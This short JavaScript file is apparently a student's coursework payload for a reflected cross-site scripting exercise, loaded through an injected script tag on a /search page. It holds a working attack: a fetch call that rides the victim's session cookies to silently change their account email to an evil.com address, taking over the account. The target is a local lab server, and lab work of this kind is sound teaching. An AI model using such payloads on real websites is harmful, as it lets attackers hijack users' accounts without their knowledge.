// FIT5003 A2 - Part B.2: externally-hosted reflected XSS payload
// Loaded via <script src="..."> injected through the /search reflected sink.
// When a logged-in victim opens the crafted URL, this script runs in their
// browser session and silently changes their account email via /profile,
// proving full account takeover (not just alert()).

fetch("http://127.0.0.1:5000/profile", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    credentials: "include", // sends the victim's auth cookie automatically
    body: "email=" + encodeURIComponent("pwned-by-36721697@evil.com") + "&password="
});
